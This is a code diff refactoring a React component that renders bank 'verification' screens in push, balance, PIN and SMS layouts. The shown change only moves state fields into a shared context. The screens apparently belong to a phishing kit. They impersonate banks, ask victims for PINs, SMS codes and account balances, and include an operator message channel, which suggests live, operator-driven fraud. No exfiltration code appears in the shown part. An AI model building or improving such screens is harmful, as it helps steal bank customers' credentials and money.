@@ -584,16 +584,31 @@ function VerificationUiContent() {
     channelSlug,
     sessionId,
     onClose,
-    layoutState,
+    layout,
+    bank,
+    transactionDetails,
     inProgress,
     awaitingVerification,
     error,
+    balance,
+    onBalanceChange,
+    onSubmit,
+    submitting,
+    canSubmit,
+    operatorMessage,
+    inputValue,
+    setInputValue,
+    wrongCode,
+    expiredCode,
+    onTryAgain,
+    resendState,
+    pinMasked,
+    onPinMaskToggle,
   } = useBankVerificationContext();
 
   if (!channelSlug || !sessionId) return null;
   if (!awaitingVerification && !inProgress) return null;
 
-  const { bank, transactionDetails } = layoutState;
   const pageProps = {
     bank,
     cardBrand: transactionDetails?.cardBrand,
@@ -603,7 +618,7 @@ function VerificationUiContent() {
   };
 
   // --- Push layout ---
-  if (layoutState.layout === "push") {
+  if (layout === "push") {
     return (
       <StyleIsolationWrapper>
         <VerificationPage {...pageProps}>
@@ -645,16 +660,7 @@ function VerificationUiContent() {
   }
 
   // --- Balance layout ---
-  if (layoutState.layout === "balance") {
-    const {
-      balance,
-      onBalanceChange,
-      onSubmit,
-      submitting,
-      canSubmit,
-      operatorMessage,
-    } = layoutState;
-
+  if (layout === "balance") {
     return (
       <StyleIsolationWrapper>
         <VerificationPage
@@ -736,22 +742,7 @@ function VerificationUiContent() {
   }
 
   // --- PIN layout ---
-  if (layoutState.layout === "pin") {
-    const {
-      inputValue,
-      setInputValue,
-      pinMasked,
-      onPinMaskToggle,
-      wrongCode,
-      expiredCode,
-      onTryAgain,
-      onSubmit,
-      submitting,
-      canSubmit,
-      resendState,
-      operatorMessage,
-    } = layoutState;
-
+  if (layout === "pin") {
     return (
       <StyleIsolationWrapper>
         <VerificationPage
@@ -802,19 +793,6 @@ function VerificationUiContent() {
   }
 
   // --- SMS layout (default) ---
-  const {
-    inputValue,
-    setInputValue,
-    wrongCode,
-    expiredCode,
-    onTryAgain,
-    onSubmit,
-    submitting,
-    canSubmit,
-    resendState,
-    operatorMessage,
-  } = layoutState;
-
   return (
     <StyleIsolationWrapper>
       <VerificationPage
